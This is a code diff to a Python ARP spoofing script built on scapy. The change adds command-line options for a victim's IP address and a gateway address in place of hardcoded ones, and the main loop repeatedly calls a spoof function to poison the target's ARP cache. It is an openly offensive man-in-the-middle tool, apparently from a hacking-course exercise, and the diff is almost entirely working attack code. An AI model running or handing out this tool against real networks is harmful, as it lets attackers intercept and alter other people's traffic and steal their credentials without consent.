@@ -1,6 +1,19 @@
+import optparse
 import scapy.all as scapy
 import time
 import sys
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target", help="Victim`s IP address")
+    parser.add_option("-g", "--gateway", dest="gateway", help="Router`s IP address")
+    (options, arguments) = parser.parse_args()
+
+    if not options.target:
+        parser.error("[-] Please specify an target, use --help for more info.")
+    elif not options.gateway:
+        parser.error("[-] Please specify a gateway, use --help for more info.")
+    return options
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -20,11 +33,12 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
 
-target_ip = "172.25.12.21"
-gateway_ip = "172.25.12.1"
-
 if __name__ == '__main__':
     try:
+        options = get_arguments()
+        target_ip = options.target
+        gateway_ip = options.gateway
+
         packets_sent_count = 0
         while True:
             spoof(target_ip, gateway_ip)
